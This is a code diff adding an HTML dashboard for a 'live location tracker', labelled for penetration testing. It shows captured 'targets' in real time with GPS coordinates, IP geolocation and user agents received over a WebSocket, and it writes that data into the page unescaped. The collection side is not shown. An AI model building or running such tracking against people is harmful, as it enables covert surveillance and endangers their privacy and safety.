@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Live Location Tracker - Admin Dashboard</title>
+  <style>
+    /* 🔹 Your original styles (unchanged) */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f8f9fa; color: #333; padding: 20px; }
+    .dashboard-header { background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%); color: white; padding: 25px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
+    .stats-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
+    .stat-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
+    .stat-number { font-size: 2.5em; font-weight: bold; color: #3498db; }
+    .map-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-bottom: 20px; height: 400px; }
+    #map { height: 100%; width: 100%; background: #e9ecef; border-radius: 5px; display: flex; align-items: center; justify-content: center; color: #6c757d; }
+    .locations-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .location-card { border-left: 4px solid #3498db; padding: 15px; margin: 10px 0; background: #f8f9fa; border-radius: 5px; }
+    .gps-card { border-left-color: #27ae60; }
+    .ip-card { border-left-color: #e74c3c; }
+    .network-card { border-left-color: #f39c12; }
+    .connection-status { position: fixed; top: 20px; right: 20px; padding: 10px 15px; border-radius: 20px; font-size: 12px; }
+    .connected { background: #27ae60; color: white; }
+    .disconnected { background: #e74c3c; color: white; }
+    .timestamp { font-size: 12px; color: #6c757d; }
+  </style>
+</head>
+<body>
+  <div class="dashboard-header">
+    <h1>🔍 LIVE LOCATION TRACKING DASHBOARD</h1>
+    <p>Real-time monitoring for authorized penetration testing</p>
+  </div>
+
+  <div class="stats-container">
+    <div class="stat-card">
+      <div class="stat-number" id="totalTargets">0</div>
+      <div>Total Targets</div>
+    </div>
+
+    <div class="stat-card">
+      <div class="stat-number" id="activeTargets">0</div>
+      <div>Active Connections</div>
+    </div>
+
+    <div class="stat-card">
+      <div class="stat-number" id="gpsLocations">0</div>
+      <div>GPS Locations</div>
+    </div>
+
+    <div class="stat-card">
+      <div class="stat-number" id="ipLocations">0</div>
+      <div>IP Locations</div>
+    </div>
+  </div>
+
+  <div class="map-container">
+    <div id="map">
+      🗺️ Map Integration Available
+      <br><br>
+      (Integrate with Google Maps or Leaflet.js)
+    </div>
+  </div>
+
+  <div class="locations-container">
+    <h2>📍 Real-Time Location Data</h2>
+    <p>New locations will appear here instantly</p>
+    <div id="locationsList"></div>
+  </div>
+
+  <div id="connectionStatus" class="connection-status disconnected">
+    🔴 DISCONNECTED
+  </div>
+
+  <script>
+    class AdminDashboard {
+      constructor() {
+        this.locations = [];
+        this.stats = {
+          totalTargets: 0,
+          activeTargets: 0,
+          gpsLocations: 0,
+          ipLocations: 0
+        };
+        this.ws = null;
+        this.init();
+      }
+
+      init() {
+        this.connectWebSocket();
+        this.updateStats();
+      }
+
+      connectWebSocket() {
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const wsUrl = `${protocol}//${window.location.host}`;
+
+        this.ws = new WebSocket(wsUrl);
+
+        this.ws.onopen = () => {
+          console.log('✅ Connected to tracking server');
+          this.updateConnectionStatus(true);
+        };
+
+        this.ws.onmessage = (event) => {
+          try {
+            const message = JSON.parse(event.data);
+
+            if (message.type === 'location_update' && message.data) {
+              this.addLocation(message.data);
+            }
+          } catch (err) {
+            console.error('Invalid WS message:', err);
+          }
+        };
+
+        this.ws.onclose = () => {
+          console.log('❌ Disconnected from server');
+          this.updateConnectionStatus(false);
+
+          // Auto-reconnect after 3s
+          setTimeout(() => this.connectWebSocket(), 3000);
+        };
+
+        this.ws.onerror = (error) => {
+          console.error('WebSocket error:', error);
+        };
+      }
+
+      addLocation(data) {
+        this.locations.unshift(data);
+
+        // Update counts
+        this.stats.totalTargets = this.locations.length;
+        this.stats.gpsLocations = this.locations.filter(l => l.gps && l.gps.latitude).length;
+        this.stats.ipLocations = this.locations.filter(l => l.ip && l.ip.ip).length;
+        this.stats.activeTargets = this.locations.length; // simplified for now
+
+        this.updateStats();
+        this.displayLocation(data);
+      }
+
+      updateStats() {
+        document.getElementById('totalTargets').textContent = this.stats.totalTargets;
+        document.getElementById('gpsLocations').textContent = this.stats.gpsLocations;
+        document.getElementById('ipLocations').textContent = this.stats.ipLocations;
+        document.getElementById('activeTargets').textContent = this.stats.activeTargets;
+      }
+
+      displayLocation(data) {
+        const container = document.getElementById('locationsList');
+        const card = document.createElement('div');
+
+        let cardType = 'location-card';
+        if (data.gps && data.gps.latitude) cardType += ' gps-card';
+        else if (data.ip && data.ip.ip) cardType += ' ip-card';
+        else if (data.network) cardType += ' network-card';
+
+        card.className = cardType;
+
+        let content = `<strong>📍 NEW LOCATION CAPTURED</strong><br>`;
+
+        if (data.gps && data.gps.latitude) {
+          content += `GPS: ${data.gps.latitude}, ${data.gps.longitude}<br>`;
+          content += `Accuracy: ${data.gps.accuracy}m<br>`;
+        }
+
+        if (data.ip && data.ip.ip) {
+          content += `IP: ${data.ip.ip} (${data.ip.city || 'Unknown'}, ${data.ip.country || 'Unknown'})<br>`;
+        }
+
+        content += `Time: <span class="timestamp">${new Date(data.timestamp).toLocaleString()}</span><br>`;
+        content += `User Agent: ${data.userAgent ? data.userAgent.substring(0, 50) + '...' : 'Unknown'}`;
+
+        card.innerHTML = content;
+        container.prepend(card);
+      }
+
+      updateConnectionStatus(connected) {
+        const statusEl = document.getElementById('connectionStatus');
+
+        if (connected) {
+          statusEl.className = 'connection-status connected';
+          statusEl.textContent = '🟢 CONNECTED - LIVE';
+        } else {
+          statusEl.className = 'connection-status disconnected';
+          statusEl.textContent = '🔴 DISCONNECTED';
+        }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => new AdminDashboard());
+  </script>
+</body>
+</html>
+
